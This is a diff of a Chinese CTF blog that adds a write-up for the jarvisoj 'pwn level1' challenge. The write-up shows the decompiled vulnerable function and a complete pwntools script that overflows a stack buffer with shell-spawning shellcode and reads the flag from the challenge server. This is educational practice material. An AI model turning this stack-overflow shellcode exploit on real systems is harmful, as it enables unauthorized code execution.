+NX没有开启, 很可能是ret2shellcode
+</p>
+
+<p>
+拖进IDA, 直接F5
+</p>
+
+<div class="org-src-container">
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span><br><span class="line"></span>{</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World!\n"</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+</div>
+
+<p>
+跟进vulnerable_function
+</p>
+<div class="org-src-container">
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+</div>
+
+<p>
+read函数存在非常明显的溢出
+</p>
+
+<p>
+同时可以发现程序运行时会输出buf的地址, 然后使用read函数读取0x100字节内容
+</p>
+
+<p>
+那基本思路应该是先获取buf地址(设为p), 然后构造shellcode+p的组合使得函数返回到buf开头执行我们的代码
+</p>
+</div>
+</div>
+
+
+<div id="outline-container-sec-2" class="outline-2">
+<h2 id="sec-2">writeup</h2>
+<div class="outline-text-2" id="text-2">
+<div class="org-src-container">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line"><span class="comment"># io = process('./level1')</span></span><br><span class="line"></span><br><span class="line">address = re.search(<span class="string">r'0x\w+'</span>, io.recv()).group()</span><br><span class="line">address = int(address, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload += (<span class="number">0x88</span> + <span class="number">0x4</span> - len(payload)) * <span class="string">'\x90'</span> + p32(address)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.interactive()</span></span><br><span class="line">io.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+</div>
+</div>
+</div>
+
+Last Updated 2018-05-09 三 22:50.<br>Render by <a href="https://github.com/CodeFalling/hexo-renderer-org" target="_blank" rel="noopener">hexo-renderer-org</a> with <a href="http://www.gnu.org/software/emacs/" target="_blank" rel="noopener">Emacs</a> 25.3.1 (<a href="http://orgmode.org" target="_blank" rel="noopener">Org</a> mode 8.2.10)
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://yintianliang.github.io/2018/03/23/jarvisoj_pwn_level1/" data-id="cjgz87au10004hkwj56mfa1c9" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jarvisoj/">jarvisoj</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
 
     </footer>
   </div>
@@ -205,7 +800,7 @@ ssh fd@pwnable.kr -p2222 (pw:guest)
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://yintianliang.github.io/2017/12/26/pip_fail_to_install_pwntools/" data-id="cjgx6lzv70003azwj7unblo0b" class="article-share-link">分享</a>
+      <a data-url="https://yintianliang.github.io/2017/12/26/pip_fail_to_install_pwntools/" data-id="cjgz87au60008hkwjcyv0ibmx" class="article-share-link">分享</a>
       
       
       
@@ -285,7 +880,7 @@ Last Updated 2018-05-08 二 12:25.<br>Render by <a href="https://github.com/Code
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://yintianliang.github.io/2017/12/26/gnomre-terminal-transparency/" data-id="cjgx6lzv40001azwjw4fhv3m2" class="article-share-link">分享</a>
+      <a data-url="https://yintianliang.github.io/2017/12/26/gnomre-terminal-transparency/" data-id="cjgz87atp0000hkwj45d04wko" class="article-share-link">分享</a>
       
       
       
@@ -331,15 +926,15 @@ Last Updated 2018-05-08 二 12:25.<br>Render by <a href="https://github.com/Code
 
 <div class="org-src-container">
 
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.建立 init.d 文件夹, 尽管对于arch 来说没有卵用</span></span><br><span class="line">sudo mkdir /etc/init.d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.安装内核头文件, 因为接下来需要编译内核模块, 以内核4.14为例</span></span><br><span class="line">sudo pacman -S linux414-headers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.安装ncurses5-compat-libs, 因为vm-tools依赖ncurses5, 而arch只有ncurses6</span></span><br><span class="line"><span class="comment"># 这个地方如果GPG校验失败的话, 就添加 --m-arg "--skipchecksums --skippgpcheck"</span></span><br><span class="line">yaourt -S ncurses5-compat-libs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.下载VMware Linux版, 得到一个.bundle文件</span></span><br><span class="line"><span class="comment"># 以root身份运行之</span></span><br><span class="line">sudo chmod +x xxx.bundle</span><br><span class="line">sudo ./xxx.bundle</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.建立 init.d 文件夹, 尽管对于arch 来说没有卵用</span></span><br><span class="line">sudo mkdir /etc/init.d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.安装内核头文件, 因为接下来需要编译内核模块, 以内核4.14为例</span></span><br><span class="line">sudo pacman -S linux414-headers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.安装ncurses5-compat-libs, 因为vm-tools依赖ncurses5, 而arch只有ncurses6</span></span><br><span class="line"><span class="comment"># 这个地方如果GPG校验失败的话, 就添加 --m-arg "--skipchecksums --skippgpcheck"</span></span><br><span class="line">yaourt -S ncurses5-compat-libs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.下载VMware Linux版, 得到一个.bundle文件</span></span><br><span class="line"><span class="comment"># 以root身份运行之</span></span><br><span class="line">sudo chmod +x xxx.bundle</span><br><span class="line">sudo ./xxx.bundle</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一开始每次更新完内核都要使用如下命令重新编译内核模块的</span></span><br><span class="line"><span class="comment"># 不过某次更新以后变成自动弹出窗口请求root权限进行编译, 就不用执行下面的代码了</span></span><br><span class="line"><span class="comment"># sudo vmware-modconfig --console --install-all</span></span><br></pre></td></tr></table></figure>
 </div>
 
-Last Updated 2018-05-08 二 12:35.<br>Render by <a href="https://github.com/CodeFalling/hexo-renderer-org" target="_blank" rel="noopener">hexo-renderer-org</a> with <a href="http://www.gnu.org/software/emacs/" target="_blank" rel="noopener">Emacs</a> 25.3.1 (<a href="http://orgmode.org" target="_blank" rel="noopener">Org</a> mode 8.2.10)
+Last Updated 2018-05-08 二 12:38.<br>Render by <a href="https://github.com/CodeFalling/hexo-renderer-org" target="_blank" rel="noopener">hexo-renderer-org</a> with <a href="http://www.gnu.org/software/emacs/" target="_blank" rel="noopener">Emacs</a> 25.3.1 (<a href="http://orgmode.org" target="_blank" rel="noopener">Org</a> mode 8.2.10)
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://yintianliang.github.io/2017/11/30/install_vmware_on_archlinux/" data-id="cjgx6lzv60002azwjd6hphcji" class="article-share-link">分享</a>
+      <a data-url="https://yintianliang.github.io/2017/11/30/install_vmware_on_archlinux/" data-id="cjgz87aty0002hkwjuyr18lf8" class="article-share-link">分享</a>
       
       
       
@@ -383,7 +978,7 @@ Last Updated 2018-05-08 二 12:35.<br>Render by <a href="https://github.com/Code
   <div class="widget-wrap">
     <h3 class="widget-title categories">分类</h3>
     <div class="widget" id="categories">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/writeup/">writeup</a><span class="category-list-count">1</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/writeup/">writeup</a><span class="category-list-count">6</span></li></ul>
     </div>
   </div>
 
@@ -393,7 +988,7 @@ Last Updated 2018-05-08 二 12:35.<br>Render by <a href="https://github.com/Code
   <div class="widget-wrap">
     <h3 class="widget-title tagcloud">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/CTF/" style="font-size: 14px;">CTF</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/gnome/" style="font-size: 14px;">gnome</a> <a href="/tags/linux/" style="font-size: 25px;">linux</a> <a href="/tags/pwn/" style="font-size: 14px;">pwn</a> <a href="/tags/pwnable-kr/" style="font-size: 14px;">pwnable.kr</a> <a href="/tags/writeup/" style="font-size: 14px;">writeup</a>
+      <a href="/tags/CTF/" style="font-size: 14px;">CTF</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/gnome/" style="font-size: 14px;">gnome</a> <a href="/tags/jarvisoj/" style="font-size: 21.33px;">jarvisoj</a> <a href="/tags/linux/" style="font-size: 17.67px;">linux</a> <a href="/tags/pwn/" style="font-size: 25px;">pwn</a> <a href="/tags/pwnable-kr/" style="font-size: 14px;">pwnable.kr</a> <a href="/tags/writeup/" style="font-size: 25px;">writeup</a>
     </div>
   </div>
 
@@ -413,15 +1008,15 @@ Last Updated 2018-05-08 二 12:35.<br>Render by <a href="https://github.com/Code
           </li>
         
           <li>
-            <a href="/2017/12/26/pip_fail_to_install_pwntools/">pip安装pwntools时卡住</a>
+            <a href="/2018/04/14/jarvisoj_pwn_level3/">jarvisoj - pwn - level3</a>
           </li>
         
           <li>
-            <a href="/2017/12/26/gnomre-terminal-transparency/">解决Gnome终端无法设置透明度的问题</a>
+            <a href="/2018/04/14/jarvisoj_pwn_level2/">jarvisoj - pwn - level2</a>
           </li>
         
           <li>
-            <a href="/2017/11/30/install_vmware_on_archlinux/">在ArchLinux上安装VMware</a>
+            <a href="/2018/04/14/jarvisoj_pwn_level2_x64/">jarvisoj - pwn - level2_x64</a>
           </li>
         
       </ul>
@@ -433,7 +1028,7 @@ Last Updated 2018-05-08 二 12:35.<br>Render by <a href="https://github.com/Code
   <div class="widget-wrap">
     <h3 class="widget-title archive">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
